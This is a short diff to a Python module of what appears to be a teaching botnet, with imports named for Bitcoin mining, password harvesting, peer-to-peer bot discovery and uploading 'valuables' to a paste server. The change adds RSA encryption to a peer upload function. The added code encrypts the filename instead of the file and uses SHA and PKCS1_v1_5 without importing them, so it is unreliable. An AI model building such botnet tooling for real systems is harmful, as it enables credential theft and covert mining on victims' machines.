@@ -6,11 +6,20 @@ from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
 
+from Crypto.PublicKey import RSA
+
 def p2p_upload(fn):
     sconn = find_bot()
     #sconn.verbose=True
     sconn.send(bytes("FILE", "ascii"))
-    p2p_upload_file(sconn, fn)
+    
+    # Encrypt with rsa
+    h = SHA.new(fn)
+    key=RSA.importKey(open(os.path.join("pastebot.net", "master_rsa.pub")).read())
+    cipher = PKCS1_v1_5.new(key)
+    ciphertext = cipher.encrypt(fn+h.digest())
+    
+    p2p_upload_file(sconn, ciphertext)
 
 def p2p_echo():
     try:
